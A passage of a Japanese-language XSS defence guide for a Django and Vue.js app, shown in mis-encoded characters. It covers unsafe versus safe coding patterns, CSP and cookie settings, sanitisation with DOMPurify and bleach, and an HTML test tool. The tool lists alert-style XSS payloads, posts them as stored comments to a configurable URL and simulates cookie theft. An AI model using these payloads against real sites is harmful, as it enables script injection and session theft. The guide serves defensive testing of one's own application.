#### 4. URLãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ¤œè¨¼

```javascript
// âŒ å±é™ºï¼šæ¤œè¨¼ãªã—
<script setup>
import { ref, onMounted } from 'vue';
import { useRoute } from 'vue-router';

const route = useRoute();
const redirectUrl = ref('');

onMounted(() => {
  redirectUrl.value = route.query.redirect;  // å±é™ºï¼
  window.location.href = redirectUrl.value;  // javascript: URIæ”»æ’ƒ
});
</script>

// âœ… å®‰å…¨ï¼šãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆæ¤œè¨¼
<script setup>
import { ref, onMounted } from 'vue';
import { useRoute, useRouter } from 'vue-router';

const route = useRoute();
const router = useRouter();

onMounted(() => {
  const redirect = route.query.redirect;
  
  // ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆãƒã‚§ãƒƒã‚¯
  const allowedPaths = ['/dashboard', '/profile', '/settings'];
  
  if (redirect && allowedPaths.includes(redirect)) {
    router.push(redirect);  // âœ… å®‰å…¨
  } else if (redirect && redirect.startsWith('http')) {
    // å¤–éƒ¨URLã¯è¨±å¯ã—ãªã„
    console.error('External URLs not allowed');
  } else {
    router.push('/');  // ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ
  }
});
</script>
```

---

## å±é™ºãªã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ãƒ‘ã‚¿ãƒ¼ãƒ³

### ãƒ‘ã‚¿ãƒ¼ãƒ³1: å¼•ç”¨ç¬¦ãªã—ã®å±æ€§

```html
<!-- âŒ å±é™º -->
<input type="text" value={{ userInput }}>

<!-- æ”»æ’ƒä¾‹ -->
userInput = "test onmouseover=alert(1)"
<!-- çµæœ -->
<input type="text" value=test onmouseover=alert(1)>
<!-- ãƒã‚¦ã‚¹ã‚ªãƒ¼ãƒãƒ¼ã§å®Ÿè¡Œã•ã‚Œã‚‹ï¼ğŸ’¥ -->

<!-- âœ… å®‰å…¨ -->
<input type="text" :value="userInput">
<!-- ã¾ãŸã¯ -->
<input type="text" value="{{ userInput }}">
```

### ãƒ‘ã‚¿ãƒ¼ãƒ³2: javascript: URI

```vue
<!-- âŒ å±é™º -->
<template>
  <a :href="userUrl">ãƒªãƒ³ã‚¯</a>
</template>

<script setup>
import { ref } from 'vue';

// æ”»æ’ƒè€…ã®å…¥åŠ›
const userUrl = ref("javascript:alert(document.cookie)");
</script>

<!-- âœ… å®‰å…¨ï¼šãƒ—ãƒ­ãƒˆã‚³ãƒ«æ¤œè¨¼ -->
<script setup>
import { ref, computed } from 'vue';

const userUrl = ref("javascript:alert(1)");

const safeUrl = computed(() => {
  const url = userUrl.value.toLowerCase().trim();
  
  // å±é™ºãªãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ãƒ–ãƒ­ãƒƒã‚¯
  if (url.startsWith('javascript:') || 
      url.startsWith('data:') || 
      url.startsWith('vbscript:')) {
    return '#';  // å®‰å…¨ãªãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ
  }
  
  return userUrl.value;
});
</script>

<template>
  <a :href="safeUrl">ãƒªãƒ³ã‚¯</a>
</template>
```

### ãƒ‘ã‚¿ãƒ¼ãƒ³3: eval()ã‚„é¡ä¼¼é–¢æ•°

```javascript
// âŒ è¶…å±é™º
const userCode = request.data.code;
eval(userCode);  // ä»»æ„ã®ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ğŸ’¥

// âŒ åŒæ§˜ã«å±é™º
new Function(userCode)();
setTimeout(userCode, 1000);
setInterval(userCode, 1000);

// âœ… ä½¿ç”¨ã—ãªã„
// ã©ã†ã—ã¦ã‚‚å¿…è¦ãªå ´åˆã¯ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã§å®Ÿè¡Œ
```

### ãƒ‘ã‚¿ãƒ¼ãƒ³4: innerHTMLä½¿ç”¨

```javascript
// âŒ å±é™º
document.getElementById('content').innerHTML = userInput;

// âœ… å®‰å…¨
document.getElementById('content').textContent = userInput;

// ã¾ãŸã¯ Vue.js/Reactãªã©ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨
```

---

## ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã®å®‰å…¨æ€§ãƒã‚§ãƒƒã‚¯

### Djangoå´ã®ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

```python
# âœ… ãƒã‚§ãƒƒã‚¯é …ç›®

# 1. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®è‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ãŒæœ‰åŠ¹ã‹ï¼Ÿ
# settings.py
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'OPTIONS': {
            'autoescape': True,  # âœ… True ã§ã‚ã‚‹ã“ã¨
        },
    },
]

# 2. HttpResponse ã‚’ç›´æ¥ä½¿ã£ã¦ã„ãªã„ã‹ï¼Ÿ
# âŒ é¿ã‘ã‚‹ã¹ã
from django.http import HttpResponse
return HttpResponse(f"<h1>{user_input}</h1>")

# âœ… æ¨å¥¨
from django.shortcuts import render
return render(request, 'template.html', {'data': user_input})

# 3. mark_safe() ã‚’ä½¿ã†å ´åˆã€ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã—ã¦ã„ã‚‹ã‹ï¼Ÿ
from django.utils.safestring import mark_safe
import bleach

user_html = request.POST.get('content')
clean_html = bleach.clean(user_html, tags=['p', 'strong'])  # âœ…
safe_content = mark_safe(clean_html)

# 4. DRFã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ï¼Ÿ
from rest_framework import serializers

class CommentSerializer(serializers.ModelSerializer):
    class Meta:
        model = Comment
        fields = ['id', 'text', 'created_at']
    # âœ… JSONã§è¿”ã™ãŸã‚å®‰å…¨
```

### Vue.jså´ã®ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

```vue
<!-- âœ… ãƒã‚§ãƒƒã‚¯é …ç›® -->

<!-- 1. v-html ã‚’ä½¿ã£ã¦ã„ãªã„ã‹ï¼Ÿ -->
<!-- âŒ å±é™º -->
<div v-html="userContent"></div>

<!-- âœ… å®‰å…¨ -->
<div>{{ userContent }}</div>

<!-- 2. DOMPurify ã§ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã—ã¦ã„ã‚‹ã‹ï¼Ÿï¼ˆHTMLãŒå¿…è¦ãªå ´åˆï¼‰ -->
<script setup>
import DOMPurify from 'dompurify';
import { computed } from 'vue';

const cleanHtml = computed(() => 
  DOMPurify.sanitize(userContent.value)
);
</script>

<template>
  <div v-html="cleanHtml"></div>  <!-- âœ… ã‚µãƒ‹ã‚¿ã‚¤ã‚ºæ¸ˆã¿ -->
</template>

<!-- 3. URLãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æ¤œè¨¼ã—ã¦ã„ã‚‹ã‹ï¼Ÿ -->
<script setup>
import { useRoute } from 'vue-router';

const route = useRoute();
const id = route.params.id;

// âœ… æ•°å€¤ã®æ¤œè¨¼
if (!/^\d+$/.test(id)) {
  throw new Error('Invalid ID');
}
</script>

<!-- 4. innerHTML ã‚’ä½¿ã£ã¦ã„ãªã„ã‹ï¼Ÿ -->
<script setup>
// âŒ å±é™º
onMounted(() => {
  document.getElementById('content').innerHTML = userInput;
});

// âœ… å®‰å…¨
const content = ref(userInput);
</script>

<template>
  <div id="content">{{ content }}</div>
</template>
```

### ã‚ãªãŸã®ã‚³ãƒ¼ãƒ‰ã®è©•ä¾¡

```python
# ã‚ãªãŸã®Djangoã‚³ãƒ¼ãƒ‰ï¼ˆsettings.pyï¼‰ã‚’ç¢ºèª

# âœ… ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè¨­å®š
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]
# â†’ autoescape ã®æ˜ç¤ºçš„ãªè¨­å®šãªã—
# â†’ ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ True ãªã®ã§ âœ… å®‰å…¨

# âœ… REST Frameworkè¨­å®š
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': [
        'rest_framework.authentication.SessionAuthentication',
    ],
    # JSONã‚’è¿”ã™ãŸã‚ âœ… å®‰å…¨
}
```

```javascript
// ã‚ãªãŸã®Vue.jsã‚³ãƒ¼ãƒ‰ï¼ˆaxios.jsï¼‰ã‚’ç¢ºèª

// âœ… Axiosã®è¨­å®š
const api = axios.create({
    baseURL: API_BASE_URL,
    withCredentials: true,
    timeout: API_TIMEOUT,
});

// JSONã§ã‚„ã‚Šå–ã‚Šã—ã¦ã„ã‚‹ãŸã‚ âœ… å®‰å…¨
```

### ç·åˆè©•ä¾¡

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã®XSSé˜²å¾¡ãƒ¬ãƒ™ãƒ«                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Djangoå´:
  âœ… ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—æœ‰åŠ¹
  âœ… DRFä½¿ç”¨ï¼ˆJSON APIï¼‰
  âœ… render()ä½¿ç”¨æ¨å¥¨
  âš ï¸ ãƒ¦ãƒ¼ã‚¶ãƒ¼ç”ŸæˆHTMLã‚’è¡¨ç¤ºã™ã‚‹å ´åˆã¯è¦æ³¨æ„

Vue.jså´:
  âœ… ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ§‹æ–‡ä½¿ç”¨ï¼ˆè‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ï¼‰
  âœ… APIé€šä¿¡ã¯JSON
  âš ï¸ v-htmlã®ä½¿ç”¨ã¯é¿ã‘ã‚‹
  âš ï¸ ç›´æ¥DOMæ“ä½œã¯é¿ã‘ã‚‹

ç·åˆè©•ä¾¡: A ğŸŒŸğŸŒŸğŸŒŸğŸŒŸâ˜†
åŸºæœ¬çš„ãªé˜²å¾¡ã¯å®Œç’§ï¼
è¿½åŠ å¯¾ç­–ã§ã•ã‚‰ã«å¼·åŒ–å¯èƒ½
```

---

## è¿½åŠ ã®é˜²å¾¡ç­–

### Content Security Policy (CSP)

Content Security Policyã¯ã€æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’é˜²ããƒ–ãƒ©ã‚¦ã‚¶ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã§ã™ã€‚å³æ ¼ãªCSPã§ã¯ã€nonceã¾ãŸã¯ãƒãƒƒã‚·ãƒ¥ã‚’ä½¿ç”¨ã—ã¦ãƒ–ãƒ©ã‚¦ã‚¶ã«æœŸå¾…ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ç¤ºã—ã€æ”»æ’ƒè€…ãŒæŒ¿å…¥ã—ãŸä¸æ­£ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯æ­£ã—ã„nonceã‚„ãƒãƒƒã‚·ãƒ¥ã‚’æŒãŸãªã„ãŸã‚å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“ã€‚

```python
# Django middleware
class CSPMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        
        # Content Security Policyãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¿½åŠ 
        response['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "font-src 'self' data:; "
            "connect-src 'self' http://localhost:8000;"
        )
        
        return response

# settings.py ã«è¿½åŠ 
MIDDLEWARE = [
    # ...
    'path.to.CSPMiddleware',
]
```

**ã¾ãŸã¯ django-csp ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨:**

```bash
pip install django-csp
```

```python
# settings.py
MIDDLEWARE = [
    # ...
    'csp.middleware.CSPMiddleware',
]

# CSPè¨­å®š
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com")
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
CSP_IMG_SRC = ("'self'", "data:", "https:")
CSP_CONNECT_SRC = ("'self'", "http://localhost:8000")

# æœ¬ç•ªç’°å¢ƒã§ã¯ã‚ˆã‚Šå³æ ¼ã«
# CSP_SCRIPT_SRC = ("'self'",)  # 'unsafe-inline'ã‚’å‰Šé™¤
# CSP_STYLE_SRC = ("'self'",)   # 'unsafe-inline'ã‚’å‰Šé™¤
```

### X-XSS-Protection ãƒ˜ãƒƒãƒ€ãƒ¼

```python
# settings.py
SECURE_BROWSER_XSS_FILTER = True  # X-XSS-Protection: 1; mode=block

# ã¾ãŸã¯ middleware ã§ç›´æ¥è¨­å®š
class SecurityHeadersMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        response['X-Content-Type-Options'] = 'nosniff'
        response['X-Frame-Options'] = 'DENY'
        response['X-XSS-Protection'] = '1; mode=block'
        return response
```

### HTTPOnly Cookie

```python
# settings.py
SESSION_COOKIE_HTTPONLY = True  # âœ… JavaScriptã‹ã‚‰Cookieã‚’èª­ã‚ãªãã™ã‚‹
CSRF_COOKIE_HTTPONLY = False    # CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯JSã‹ã‚‰èª­ã‚€å¿…è¦ãŒã‚ã‚‹

# ã“ã‚Œã«ã‚ˆã‚Š document.cookie ã§ã‚»ãƒƒã‚·ãƒ§ãƒ³CookieãŒå–å¾—ã§ããªã„
```

### DOMPurify ã®å°å…¥ï¼ˆVue.jsï¼‰

```bash
npm install dompurify
npm install @types/dompurify  # TypeScriptä½¿ç”¨æ™‚
```

```vue
<template>
  <div>
    <!-- ãƒ¦ãƒ¼ã‚¶ãƒ¼ç”ŸæˆHTMLã‚’è¡¨ç¤ºã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆ -->
    <div v-html="sanitizedContent"></div>
  </div>
</template>

<script setup>
import { ref, computed } from 'vue';
import DOMPurify from 'dompurify';

const userContent = ref('<p>å®‰å…¨ãªHTML</p><script>alert("XSS")</script>');

// ã‚µãƒ‹ã‚¿ã‚¤ã‚ºå‡¦ç†
const sanitizedContent = computed(() => {
  return DOMPurify.sanitize(userContent.value, {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):)/i
  });
});
</script>
```

### å…¥åŠ›æ¤œè¨¼ã¨ã‚µãƒ‹ã‚¿ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³

```python
# Djangoå´: bleach ã‚’ä½¿ç”¨
# pip install bleach

from django.shortcuts import render
import bleach

def create_comment(request):
    if request.method == 'POST':
        user_comment = request.POST.get('comment', '')
        
        # HTMLã‚¿ã‚°ã‚’è¨±å¯ã™ã‚‹å ´åˆ
        clean_comment = bleach.clean(
            user_comment,
            tags=['p', 'strong', 'em', 'u', 'a'],
            attributes={'a': ['href', 'title']},
            protocols=['http', 'https', 'mailto'],
            strip=True  # è¨±å¯ã•ã‚Œã¦ã„ãªã„ã‚¿ã‚°ã‚’å‰Šé™¤
        )
        
        # ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ä¿å­˜
        Comment.objects.create(text=clean_comment)
        
        return render(request, 'success.html')
```

```python
# ã¾ãŸã¯å®Œå…¨ã«HTMLã‚’æ‹’å¦
import re

def create_comment(request):
    if request.method == 'POST':
        user_comment = request.POST.get('comment', '')
        
        # HTMLã‚¿ã‚°ã‚’å®Œå…¨ã«å‰Šé™¤
        clean_comment = re.sub(r'<[^>]*>', '', user_comment)
        
        # ã¾ãŸã¯ bleach.clean() ã§ã‚¿ã‚°ãªã—
        clean_comment = bleach.clean(user_comment, tags=[], strip=True)
        
        Comment.objects.create(text=clean_comment)
        
        return render(request, 'success.html')
```

---

## XSSãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«ã®ä½œæˆ

CSRFãƒ†ã‚¹ãƒˆã¨åŒæ§˜ã«ã€XSSè„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹HTMLã‚’ä½œæˆã§ãã¾ã™ã€‚

### XSSæ”»æ’ƒãƒ†ã‚¹ãƒˆãƒšãƒ¼ã‚¸

```html
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ” XSSè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #f5576c;
            text-align: center;
            margin-bottom: 30px;
        }
        .test-section {
            margin: 20px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 4px solid #f5576c;
        }
        .test-section h2 {
            color: #f5576c;
            margin-bottom: 15px;
            font-size: 1.2em;
        }
        .payload-list {
            list-style: none;
            margin: 15px 0;
        }
        .payload-list li {
            padding: 10px;
            margin: 5px 0;
            background: white;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            cursor: pointer;
            transition: background 0.2s;
        }
        .payload-list li:hover {
            background: #ffe0e6;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        button {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1em;
            margin: 5px;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #ffeaa7;
            margin: 20px 0;
        }
        #result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ” XSSè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«</h1>
        
        <div class="warning">
            <strong>âš ï¸ è­¦å‘Š:</strong><br>
            ã“ã®ãƒ„ãƒ¼ãƒ«ã¯æ•™è‚²ç›®çš„ã®ã¿ã§ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚<br>
            è‡ªåˆ†ãŒæ‰€æœ‰ãƒ»ç®¡ç†ã—ã¦ã„ã‚‹ã‚µã‚¤ãƒˆã§ã®ã¿ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚
        </div>

        <div class="test-section">
            <h2>ã‚ˆãä½¿ã‚ã‚Œã‚‹XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰</h2>
            <p>ã‚¯ãƒªãƒƒã‚¯ã§ã‚³ãƒ”ãƒ¼:</p>
            <ul class="payload-list">
                <li onclick="copyPayload(this)">&lt;script&gt;alert('XSS')&lt;/script&gt;</li>
                <li onclick="copyPayload(this)">&lt;img src=x onerror="alert('XSS')"&gt;</li>
                <li onclick="copyPayload(this)">&lt;svg onload="alert('XSS')"&gt;</li>
                <li onclick="copyPayload(this)">&lt;body onload="alert('XSS')"&gt;</li>
                <li onclick="copyPayload(this)">&lt;iframe src="javascript:alert('XSS')"&gt;</li>
                <li onclick="copyPayload(this)">" onmouseover="alert('XSS')</li>
                <li onclick="copyPayload(this)">javascript:alert('XSS')</li>
                <li onclick="copyPayload(this)">&lt;input type="text" value="test" onfocus="alert('XSS')" autofocus&gt;</li>
            </ul>
        </div>

        <div class="test-section">
            <h2>ã‚«ã‚¹ã‚¿ãƒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãƒ†ã‚¹ãƒˆ</h2>
            <label>ãƒ†ã‚¹ãƒˆURL:</label>
            <input type="text" id="testUrl" value="http://localhost:5173" placeholder="http://example.com">
            
            <label>ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰:</label>
            <textarea id="payload" placeholder="<script>alert('XSS')</script>"></textarea>
            
            <button onclick="testStored()">Stored XSS ãƒ†ã‚¹ãƒˆ</button>
            <button onclick="testReflected()">Reflected XSS ãƒ†ã‚¹ãƒˆ</button>
            <button onclick="testDOM()">DOM-based XSS ãƒ†ã‚¹ãƒˆ</button>
        </div>

        <div class="test-section">
            <h2>Cookieç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³</h2>
            <p>ç¾åœ¨ã®Cookie:</p>
            <textarea id="currentCookies" readonly></textarea>
            <button onclick="showCookies()">Cookieè¡¨ç¤º</button>
            <button onclick="testCookieSteal()">ç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³</button>
        </div>

        <div id="result"></div>
    </div>

    <script>
        const API_BASE = 'http://localhost:8000/api/';

        function copyPayload(element) {
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                showResult('âœ… ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã—ãŸ: ' + text, true);
            });
        }

        function showResult(message, isSuccess) {
            const resultDiv = document.getElementById('result');
            resultDiv.textContent = message;
            resultDiv.className = isSuccess ? 'success' : 'error';
            resultDiv.style.display = 'block';
        }

        function showCookies() {
            document.getElementById('currentCookies').value = document.cookie || '(Cookieãªã—)';
            showResult('âœ… Cookieã‚’è¡¨ç¤ºã—ã¾ã—ãŸ', true);
        }

        async function testStored() {
            const url = document.getElementById('testUrl').value;
            const payload = document.getElementById('payload').value;

            if (!payload) {
                showResult('âŒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„', false);
                return;
            }

            try {
                const response = await fetch(`${url}/api/comments/`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    credentials: 'include',
                    body: JSON.stringify({
                        text: payload
                    })
                });

                if (response.ok) {
                    showResult('âš ï¸ Stored XSSãƒ†ã‚¹ãƒˆé€ä¿¡å®Œäº†ã€‚ã‚³ãƒ¡ãƒ³ãƒˆä¸€è¦§ãƒšãƒ¼ã‚¸ã§ç¢ºèªã—ã¦ãã ã•ã„ã€‚', true);
                } else {
                    showResult(`âœ… ã‚µãƒ¼ãƒãƒ¼ãŒæ‹’å¦: ${response.status}`, true);
                }
            } catch (error) {
                showResult(`âœ… ã‚¨ãƒ©ãƒ¼: ${error.message}`, true);
            }
        }

        function testReflected() {
            const url = document.getElementById('testUrl').value;
            const payload = document.getElementById('payload').value;

            if (!payload) {
                showResult('âŒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„', false);
                return;
            }

            const testUrl = `${url}/search?q=${encodeURIComponent(payload)}`;
            showResult(`ğŸ”— Reflected XSSãƒ†ã‚¹ãƒˆç”¨URL:\n${testUrl}\n\næ–°ã—ã„ã‚¿ãƒ–ã§é–‹ã„ã¦ãƒ†ã‚¹ãƒˆã—ã¦ãã ã•ã„ã€‚`, true);
            
            // ã‚ªãƒ—ã‚·ãƒ§ãƒ³: è‡ªå‹•ã§é–‹ã
            // window.open(testUrl, '_blank');
        }

        function testDOM() {
            const payload = document.getElementById('payload').value;

            if (!payload) {
                showResult('âŒ ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„', false);
                return;
            }

            // DOM-based XSSã®ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
            const testDiv = document.createElement('div');
            testDiv.style.display = 'none';
            
            try {
                // å±é™ºãªæ“ä½œï¼ˆãƒ†ã‚¹ãƒˆç›®çš„ï¼‰
                testDiv.innerHTML = payload;
                document.body.appendChild(testDiv);
                
                showResult('âš ï¸ DOM-based XSSãƒ†ã‚¹ãƒˆ: ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¾ã—ãŸï¼ˆéè¡¨ç¤ºï¼‰', false);
                
                // ã™ãã«å‰Šé™¤
                setTimeout(() => {
                    document.body.removeChild(testDiv);
                }, 1000);
            } catch (error) {
                showResult('âœ… ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒ–ãƒ­ãƒƒã‚¯: ' + error.message, true);
            }
        }

        function testCookieSteal() {
            const cookies = document.cookie;
            
            if (!cookies) {
                showResult('âœ… CookieãŒå­˜åœ¨ã—ãªã„ã‹ã€HTTPOnlyã§ä¿è­·ã•ã‚Œã¦ã„ã¾ã™', true);
                return;
            }

            // ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆå®Ÿéš›ã«ã¯é€ä¿¡ã—ãªã„ï¼‰
            showResult(
                `âš ï¸ Cookieç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³:\n` +
                `ã‚‚ã—æ”»æ’ƒè€…ã®ã‚µã‚¤ãƒˆã ã£ãŸå ´åˆã€ä»¥ä¸‹ãŒé€ä¿¡ã•ã‚Œã¾ã™:\n\n` +
                `${cookies}\n\n` +
                `å¯¾ç­–: SESSION_COOKIE_HTTPONLY = True`,
                false
            );

            console.log('ç›—é›£ã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ - Cookie:', cookies);
        }

        // ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚
        window.onload = () => {
            console.log('%câš ï¸ XSSè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«', 'color: red; font-size: 20px; font-weight: bold;');
            console.log('ã“ã®ãƒ„ãƒ¼ãƒ«ã¯æ•™è‚²ç›®çš„ã®ã¿ã§ä½¿ç”¨ã—ã¦ãã ã•ã„');
            showCookies();
        };
    </script>
</body>
</html>
```

---

## å®Ÿè·µçš„ãªé˜²å¾¡ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

### é–‹ç™ºæ™‚ã®ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

```markdown
## Djangoå´

- [ ] ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®è‡ªå‹•ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ãŒæœ‰åŠ¹
- [ ] HttpResponse ã§ã®ç›´æ¥HTMLå‡ºåŠ›ã‚’é¿ã‘ã‚‹
- [ ] mark_safe() ä½¿ç”¨æ™‚ã¯å¿…ãšã‚µãƒ‹ã‚¿ã‚¤ã‚º
- [ ] ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’ãã®ã¾ã¾HTMLã«åŸ‹ã‚è¾¼ã¾ãªã„
- [ ] DRFä½¿ç”¨æ™‚ã¯ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãƒ¼ã‚’çµŒç”±
- [ ] Content Security Policy ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®š
- [ ] HTTPOnly Cookie ã‚’æœ‰åŠ¹åŒ–

## Vue.jså´

- [ ] v-html ã®ä½¿ç”¨ã‚’é¿ã‘ã‚‹
- [ ] å¿…è¦ãªå ´åˆã¯DOMPurifyã§ã‚µãƒ‹ã‚¿ã‚¤ã‚º
- [ ] ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆæ§‹æ–‡ {{ }} ã‚’ä½¿ç”¨
